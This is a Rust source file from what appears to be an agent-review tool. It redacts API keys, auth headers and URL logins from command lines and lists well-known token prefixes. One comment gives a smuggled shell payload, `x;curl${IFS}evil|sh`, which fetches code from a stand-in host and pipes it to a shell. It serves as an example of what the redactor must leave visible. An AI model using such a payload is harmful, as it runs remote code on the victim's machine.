//! Taking secrets out of what an agent's entry starts before it becomes an
//! item's text: a command line is where a token is written when it is not
//! in a variable (`"apiKeyHelper": "echo sk-ant-…"`, `--api-key …`, a header
//! for `curl`). What is taken out is hidden from the local rules and the AI
//! alike, and a payload hidden in it would go unread, so only what can be
//! nothing but a value is: a run of token characters (see
//! `is_token_shaped`), never a word with a shell character in it, never a
//! path or an expansion (`$TOKEN`), which are what a review needs to see.
//!
//! Not covered, and sent as written: a secret in a header other than
//! `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word
//! after a flag named for authorization rather than a secret
//! (`--authorization v`), and a quoted value of several words.

use crate::sweep::judge::secrets::{REDACTED, is_secret_name};

/// The beginnings of tokens that say what they are by themselves: Anthropic
/// and `OpenAI` keys, GitHub, GitLab, Slack, AWS, Google, npm and `PyPI` tokens.
const TOKEN_PREFIXES: &[&str] = &[
    "sk-",
    "sk_live_",
    "sk_test_",
    "ghp_",
    "gho_",
    "ghu_",
    "ghs_",
    "ghr_",
    "github_pat_",
    "glpat-",
    "xoxb-",
    "xoxp-",
    "xoxa-",
    "xoxs-",
    "AKIA",
    "ASIA",
    "AIza",
    "ya29.",
    "npm_",
    "pypi-",
];

/// The shortest word with a token's beginning that is taken for one.
/// Arbitrary: shorter than any real token, longer than a flag such as
/// `sk-learn`.
const MIN_PREFIXED_TOKEN: usize = 16;

/// The shortest word with no telling beginning that is taken for a token
/// when it mixes upper and lower case and digits. Arbitrary: a hash in hex
/// or a UUID never mixes case, a token of 32 random characters always does.
const MIN_BARE_TOKEN: usize = 32;

/// What the word before asked of the next one.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Next {
    /// Nothing.
    Word,
    /// It is the value of a flag or header named for a secret.
    Value,
}

/// `line` with the secrets in it taken out, as `REDACTED`:
///
/// - who an address logs in as (`scheme://user:password@`, the whole of it);
/// - the value of an `Authorization:` header, after its scheme where it has
///   one (`Bearer`, `token`), and the word after `Bearer` or `Basic`;
/// - the value of `NAME=value` where a name before an `=` is named for a
///   secret (`GITHUB_TOKEN=x`, `--env=API_KEY=x`, `--token=x`);
/// - the word after a flag named for a secret (`--api-key x`);
/// - a word that is a token by its look (see `is_token`).
///
/// Each only where it is token-shaped. The line is read word by word, as
/// blanks split it; quotes around a word stay where they are.
pub(super) fn redacted(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let mut next = Next::Word;
    let mut word_start = None;
    for (index, character) in line.char_indices() {
        match (character.is_whitespace(), word_start) {
            (true, Some(start)) => {
                out.push_str(&redacted_word(&line[start..index], &mut next));
                out.push(character);
                word_start = None;
            }
            (true, None) => out.push(character),
            (false, None) => word_start = Some(index),
            (false, Some(_)) => {}
        }
    }
    if let Some(start) = word_start {
        out.push_str(&redacted_word(&line[start..], &mut next));
    }
    out
}

/// One word of a line, with what the word before asked of it.
fn redacted_word(word: &str, next: &mut Next) -> String {
    let quotes: &[char] = &['"', '\''];
    let core = word.trim_matches(quotes);
    if core.is_empty() {
        return word.to_string();
    }
    let at = word.len() - word.trim_start_matches(quotes).len();
    let (before, after) = (&word[..at], &word[at + core.len()..]);
    let asked = std::mem::replace(next, Next::Word);
    let lower = core.to_ascii_lowercase();
    let core = if matches!(lower.as_str(), "bearer" | "basic")
        || (asked == Next::Value && is_auth_scheme(&lower))
        || lower.ends_with("authorization:")
    {
        *next = Next::Value;
        core.to_string()
    } else if asked == Next::Value {
        value(core).to_string()
    } else if let Some((header, rest)) = lower
        .split_once("authorization:")
        .filter(|(_, rest)| !rest.is_empty())
    {
        let name_end = header.len() + "authorization:".len();
        if is_auth_scheme(rest) {
            *next = Next::Value;
            core.to_string()
        } else {
            format!("{}{}", &core[..name_end], value(&core[name_end..]))
        }
    } else {
        let core = without_login(core);
        if core.starts_with('-') && !core.contains('=') && is_secret_name(&core) {
            *next = Next::Value;
            core
        } else {
            without_assigned_secret(&core)
        }
    };
    format!("{before}{core}{after}")
}

/// Whether `lower` is the scheme of an `Authorization` header, which says
/// what kind the value after it is (`Bearer x`, `token x`).
fn is_auth_scheme(lower: &str) -> bool {
    matches!(lower, "bearer" | "basic" | "token" | "digest")
}

/// Whether `word` can be nothing but a value: token characters only
/// (letters, digits and `._~%+=:/-_`), and not a path or an expansion.
/// Anything with a shell character in it (`x;curl${IFS}evil|sh`) may be
/// code, and taking it out would hide it from the review.
fn is_token_shaped(word: &str) -> bool {
    !word.is_empty()
        && !word.starts_with(['$', '/', '~', '.'])
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._~%+=:/-_".contains(c))
}

/// `word` as the value of something named for a secret: taken out where it
/// is token-shaped, else as written.
fn value(word: &str) -> &str {
    if is_token_shaped(word) {
        REDACTED
    } else {
        word
    }
}

/// `word` with the value after the first name before an `=` that is named
/// for a secret taken out (`--env=API_KEY=x`), or the word itself where it
/// is a token by its look.
fn without_assigned_secret(word: &str) -> String {
    let mut name_end = 0;
    for part in word.split('=') {
        let value_start = name_end + part.len() + 1;
        if value_start > word.len() {
            break;
        }
        if is_secret_name(part) {
            return format!(
                "{}={}",
                &word[..value_start - 1],
                value(&word[value_start..])
            );
        }
        name_end = value_start;
    }
    if is_token(word) {
        REDACTED.to_string()
    } else {
        word.to_string()
    }
}

/// `word` with who each address in it logs in as taken out, where that is
/// token-shaped: `git+https://ghp_x@github.com/r` is
/// `git+https://github.com/r`.
pub(super) fn without_login(word: &str) -> String {
    let mut out = String::with_capacity(word.len());
    let mut rest = word;
    while let Some(at) = rest.find("://") {
        let (before, after) = rest.split_at(at + 3);
        out.push_str(before);
        let end = after
            .find(|c: char| matches!(c, '/' | '?' | '#' | '"' | '\'') || c.is_whitespace())
            .unwrap_or(after.len());
        let authority = &after[..end];
        out.push_str(
            authority
                .rsplit_once('@')
                .filter(|(login, _)| is_token_shaped(login))
                .map_or(authority, |(_, host)| host),
        );
        rest = &after[end..];
    }
    out.push_str(rest);
    out
}

/// Whether `word` is a token by its look: one of `TOKEN_PREFIXES` and at
/// least `MIN_PREFIXED_TOKEN` characters, or at least `MIN_BARE_TOKEN`
/// characters that mix upper and lower case and digits; letters, digits,
/// `_`, `-` and `.` only.
fn is_token(word: &str) -> bool {
    let plain = word
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'));
    let prefixed = word.len() >= MIN_PREFIXED_TOKEN
        && TOKEN_PREFIXES.iter().any(|prefix| word.starts_with(prefix));
    let mixed = word.len() >= MIN_BARE_TOKEN
        && word.chars().any(|c| c.is_ascii_uppercase())
        && word.chars().any(|c| c.is_ascii_lowercase())
        && word.chars().any(|c| c.is_ascii_digit());
    plain && (prefixed || mixed)
}
